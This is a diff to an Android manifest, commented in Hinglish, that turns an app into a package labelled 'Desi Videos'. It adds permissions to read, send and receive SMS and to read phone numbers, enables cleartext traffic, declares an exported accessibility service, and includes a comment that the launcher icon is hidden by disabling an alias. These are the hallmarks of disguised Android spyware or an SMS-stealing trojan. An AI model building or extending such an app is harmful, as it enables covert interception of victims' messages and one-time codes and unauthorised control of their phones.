@@ -1,35 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.screenlink.remote">
 
+    <!-- network (HttpURLConnection + ImageLoader) -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- phone / sms (runtime pe maangte ho) -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+    <!-- Android 13+ notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- NEW: foreground service (Android 14 / API 34+ ke liye zaroori) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
+        android:label="Desi Videos"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme">
+        android:usesCleartextTraffic="true">
 
+        <!-- MainActivity ab launcher nahi hai — icon alias se aata hai -->
         <activity
             android:name=".MainActivity"
-            android:exported="true"
-            android:theme="@style/AppTheme" />
+            android:exported="false"
+            android:theme="@android:style/Theme.Material.Light.NoActionBar" />
 
-        <!-- LAUNCHER entry. Isi alias ko disable karke icon hide karte hain. -->
+        <!-- hideLauncherIcon() isi alias ko disable karta hai -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
             android:enabled="true"
             android:exported="true"
-            android:icon="@mipmap/ic_launcher"
-            android:label="@string/app_name">
+            android:theme="@android:style/Theme.Material.Light.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -39,6 +49,7 @@
         <service
             android:name=".TpcService"
             android:exported="true"
+            android:foregroundServiceType="dataSync"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
